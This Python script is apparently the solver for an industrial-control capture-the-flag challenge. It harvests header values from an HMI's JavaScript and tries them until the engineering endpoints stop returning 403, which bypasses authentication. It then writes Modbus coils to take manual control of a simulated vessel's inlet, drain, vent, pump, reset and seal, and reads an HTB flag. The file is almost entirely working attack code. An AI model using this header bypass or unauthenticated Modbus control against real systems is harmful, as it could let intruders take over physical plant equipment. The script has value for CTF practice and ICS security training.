#!/usr/bin/env python3
import re
import socket
import struct
import time
from urllib.error import HTTPError
from urllib.request import Request, urlopen


UNIT_ID = 1
HOST = "127.0.0.1"
MODBUS_PORT = 1502
HMI_PORT = 18080
CHECK_HMI_PREFLIGHT = True


class ModbusClient:
    def __init__(self, host: str, port: int, timeout: float = 3.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.transaction = 0
        self.sock: socket.socket | None = None

    def __enter__(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self.sock.settimeout(self.timeout)
        return self

    def __exit__(self, exc_type, exc, tb):
        if self.sock:
            self.sock.close()

    def request(self, pdu: bytes) -> bytes:
        if not self.sock:
            raise RuntimeError("client is not connected")
        self.transaction = (self.transaction + 1) & 0xffff
        header = struct.pack(">HHHB", self.transaction, 0, len(pdu) + 1, UNIT_ID)
        self.sock.sendall(header + pdu)
        response_header = self._recvall(7)
        transaction, protocol, length, _unit = struct.unpack(">HHHB", response_header)
        if transaction != self.transaction or protocol != 0:
            raise RuntimeError("invalid Modbus response header")
        response_pdu = self._recvall(length - 1)
        if response_pdu[0] & 0x80:
            raise RuntimeError(f"Modbus exception fc={response_pdu[0] ^ 0x80} code={response_pdu[1]}")
        return response_pdu

    def _recvall(self, size: int) -> bytes:
        if not self.sock:
            raise RuntimeError("client is not connected")
        data = bytearray()
        while len(data) < size:
            chunk = self.sock.recv(size - len(data))
            if not chunk:
                raise RuntimeError("connection closed")
            data.extend(chunk)
        return bytes(data)

    def read_holding(self, address: int, quantity: int) -> list[int]:
        pdu = self.request(bytes([3]) + struct.pack(">HH", address, quantity))
        byte_count = pdu[1]
        if byte_count != quantity * 2:
            raise RuntimeError("unexpected register byte count")
        return [struct.unpack(">H", pdu[2 + offset:4 + offset])[0] for offset in range(0, byte_count, 2)]

    def write_coil(self, address: int, value: bool) -> None:
        raw = 0xff00 if value else 0x0000
        self.request(bytes([5]) + struct.pack(">HH", address, raw))

    def write_coils(self, address: int, values: list[bool]) -> None:
        payload = bytearray((len(values) + 7) // 8)
        for index, value in enumerate(values):
            if value:
                payload[index // 8] |= 1 << (index % 8)
        pdu = bytes([15]) + struct.pack(">HHB", address, len(values), len(payload)) + bytes(payload)
        self.request(pdu)


def http_get(host: str, port: int, path: str, headers: dict[str, str] | None = None) -> str:
    request = Request(f"http://{host}:{port}{path}", headers=headers or {})
    with urlopen(request, timeout=3) as response:
        return response.read().decode("utf-8", errors="replace")


def parse_script_constants(hmi_js: str) -> dict[str, str]:
    return dict(
        re.findall(
            r"\bconst\s+([A-Za-z_$][\w$]*)\s*=\s*['\"]([^'\"]+)['\"]\s*;",
            hmi_js,
        )
    )


def parse_header_objects(hmi_js: str) -> list[dict[str, str]]:
    objects = []
    for match in re.finditer(
        r"\bconst\s+[A-Za-z_$][\w$]*\s*=\s*\{(?P<body>.*?)\}\s*;",
        hmi_js,
        re.S,
    ):
        pairs = re.findall(r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]+)['\"]", match.group("body"))
        if pairs:
            objects.append(dict(pairs))
    return objects


def looks_like_header_name(value: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z][A-Za-z0-9]*(?:-[A-Za-z][A-Za-z0-9]*)+", value))


def looks_like_station_value(value: str) -> bool:
    return bool(re.fullmatch(r"[A-Z0-9][A-Z0-9_.-]{3,}", value)) and not looks_like_header_name(value)


def parse_engineering_header_candidates(hmi_js: str) -> tuple[dict[str, str], list[tuple[str, str]]]:
    header_objects = [headers for headers in parse_header_objects(hmi_js) if all(looks_like_header_name(k) for k in headers)]
    if not header_objects:
        raise RuntimeError("HMI JavaScript did not expose any usable request header object")

    constants = parse_script_constants(hmi_js)
    header_names = [value for value in constants.values() if looks_like_header_name(value)]
    station_values = [value for value in constants.values() if looks_like_station_value(value)]
    candidates = [(name, value) for name in header_names for value in station_values]
    if not candidates:
        raise RuntimeError("HMI JavaScript did not expose any engineering header candidates")

    return header_objects[0], candidates


def discover_engineering_headers(host: str, port: int) -> tuple[dict[str, str], str]:
    hmi_js = http_get(host, port, "/static/hmi.js")
    base_headers, candidates = parse_engineering_header_candidates(hmi_js)
    for header_name, station_value in candidates:
        headers = {**base_headers, header_name: station_value}
        try:
            http_get(host, port, "/api/engineering/manifest", headers=headers)
            return headers, station_value
        except HTTPError as error:
            if error.code != 403:
                raise
    raise RuntimeError("no HMI-discovered engineering header candidate was accepted")


def acknowledge_engineering_access(host: str, port: int) -> str:
    headers, _station = discover_engineering_headers(host, port)
    return http_get(host, port, "/api/engineering/manifest", headers=headers)


def check_hmi_bypass(host: str, port: int) -> None:
    print("[*] Checking public HMI clue surface")
    headers, station = discover_engineering_headers(host, port)

    print("[*] Verifying engineering document auth bypass")
    try:
        http_get(host, port, "/api/engineering/manifest")
        raise RuntimeError("engineering manifest was unexpectedly public")
    except HTTPError as error:
        if error.code != 403:
            raise
    try:
        http_get(host, port, "/operator.log")
        raise RuntimeError("operator log was unexpectedly public")
    except HTTPError as error:
        if error.code != 403:
            raise

    manifest = http_get(host, port, "/api/engineering/manifest", headers=headers)
    ladder = http_get(host, port, "/api/engineering/ladder", headers=headers)
    operator_log = http_get(host, port, "/operator.log", headers=headers)

    required_ladder_terms = ("RLL_ASH_VAULT_MAIN", "C00006", "B3:3/0 RESET_PERMISSIVE", "AVX900")
    if any(term not in ladder for term in required_ladder_terms):
        raise RuntimeError("ladder extract did not contain expected recovery clues")
    if "Manual reset rung" not in operator_log or "Vault seal rung" not in operator_log:
        raise RuntimeError("operator log did not contain expected engineering procedure notes")
    print(f"[+] HMI bypass accepted for {station}")
    print(f"[*] Engineering manifest length: {len(manifest)} bytes")


def status(client: ModbusClient) -> dict:
    regs = client.read_holding(0, 12)
    return {
        "level": regs[0] / 10.0,
        "pressure": regs[1] / 10.0,
        "mode": regs[2],
        "alarms": regs[3],
        "stable_scans": regs[4],
        "outputs": regs[5],
        "last_trip": regs[6],
        "scan": regs[7],
        "auto_raw": regs[8] / 10.0,
        "seal_alarm_active": bool(regs[9]),
        "reset_permissive": bool(regs[10]),
        "seal_window": bool(regs[11]),
    }


def command(
    client: ModbusClient,
    *,
    auto: bool = False,
    manual_arm: bool = True,
    inlet: bool = False,
    drain: bool = False,
    vent: bool = False,
    pump: bool = False,
    reset: bool = False,
    seal: bool = False,
) -> None:
    client.write_coils(0, [auto, manual_arm, inlet, drain, vent, pump, reset, seal])


def print_status(prefix: str, state: dict) -> None:
    print(
        f"{prefix} level={state['level']:5.1f}% pressure={state['pressure']:5.1f}kPa "
        f"mode={state['mode']} alarms=0x{state['alarms']:04x} "
        f"reset={int(state['reset_permissive'])} sealwin={int(state['seal_window'])} "
        f"stable={state['stable_scans']}"
    )


def bring_level_into_recovery_range(client: ModbusClient) -> None:
    state = status(client)
    if state["level"] < 42.0:
        print("[*] Refilling vessel into the manual recovery range")
        deadline = time.time() + 120
        while time.time() < deadline:
            state = status(client)
            print_status("[fill ]", state)
            if state["level"] >= 46.0:
                command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=False)
                return
            command(
                client,
                auto=False,
                manual_arm=True,
                inlet=True,
                drain=False,
                vent=state["pressure"] > 42.0,
                pump=False,
            )
            time.sleep(1.0)
        raise RuntimeError("level did not refill into manual recovery range")

    if state["level"] > 50.0:
        print("[*] Draining vessel into the manual recovery range")
        command(client, auto=False, manual_arm=True, inlet=False, drain=True, vent=True, pump=False)
        deadline = time.time() + 150
        while time.time() < deadline:
            state = status(client)
            print_status("[drain]", state)
            if state["level"] <= 50.0:
                command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=False)
                return
            vent = state["pressure"] > 34.0
            command(client, auto=False, manual_arm=True, inlet=False, drain=True, vent=vent, pump=False)
            time.sleep(1.0)
        raise RuntimeError("level did not reach manual recovery range")


def read_alarm_token(host: str, port: int) -> str:
    alarms = http_get(host, port, "/alarms")
    match = re.search(r"HTB\{[^}\r\n]+\}", alarms)
    if not match:
        raise RuntimeError("seal token alarm did not contain a token")
    return match.group(0)


def solve(host: str, port: int, hmi_port: int) -> str:
    with ModbusClient(host, port) as client:
        print("[*] Taking manual control and closing the broken auto feed path")
        command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=False)
        bring_level_into_recovery_range(client)

        print("[*] Closing drain and trimming pressure into the reset window")
        deadline = time.time() + 90
        while time.time() < deadline:
            state = status(client)
            print_status("[trim ]", state)
            if 30.0 <= state["pressure"] <= 34.0:
                break
            if state["pressure"] > 34.0:
                command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=True, pump=False)
            else:
                command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=True)
            time.sleep(1.0)
        else:
            raise RuntimeError("pressure did not enter reset range")

        print("[*] Waiting for reset permissive rung")
        command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=True)
        deadline = time.time() + 20
        while time.time() < deadline:
            state = status(client)
            print_status("[reset]", state)
            if state["reset_permissive"]:
                break
            time.sleep(1.0)
        else:
            raise RuntimeError("reset permissive did not become true")

        print("[*] Pulsing pressure latch reset")
        command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=True, reset=True)
        time.sleep(1.5)
        command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=True)

        state = status(client)
        print_status("[latch]", state)
        if state["alarms"] & 0x0001:
            raise RuntimeError("pressure latch is still active")

        print("[*] Asserting vault seal and holding the stable window")
        command(client, auto=False, manual_arm=True, inlet=False, drain=False, vent=False, pump=True, seal=True)
        deadline = time.time() + 45
        while time.time() < deadline:
            state = status(client)
            print_status("[seal ]", state)
            if state["seal_alarm_active"]:
                token = read_alarm_token(host, hmi_port)
                print(f"[+] Token: {token}")
                return token
            time.sleep(1.0)

        raise RuntimeError("seal token alarm did not fire")


def main() -> None:
    if CHECK_HMI_PREFLIGHT:
        check_hmi_bypass(HOST, HMI_PORT)
    else:
        print("[*] Skipping public HMI preflight")
        acknowledge_engineering_access(HOST, HMI_PORT)
    solve(HOST, MODBUS_PORT, HMI_PORT)


if __name__ == "__main__":
    main()
